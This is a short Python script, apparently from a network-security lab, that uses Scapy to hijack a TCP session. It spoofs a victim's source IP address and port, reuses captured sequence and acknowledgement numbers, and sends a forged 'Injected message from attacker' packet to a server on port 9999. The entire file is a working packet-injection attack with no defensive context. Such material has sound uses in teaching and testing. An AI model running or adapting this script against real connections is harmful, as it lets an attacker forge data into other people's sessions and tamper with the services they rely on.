from scapy.all import *

src_ip = "192.168.126.130"       # Spoofed source
dst_ip = "192.168.126.128"
src_port = 45934          # Replace with victim's source port
dst_port = 9999            # Server’s listening port
seq = 203270156              # Captured sequence number
ack = 2922802718        # Captured ack number
payload = "Injected message from attacker\n"

ip = IP(src=src_ip, dst=dst_ip)
tcp = TCP(sport=src_port, dport=dst_port, flags="PA", seq=seq, ack=ack)
pkt = ip/tcp/payload

send(pkt)

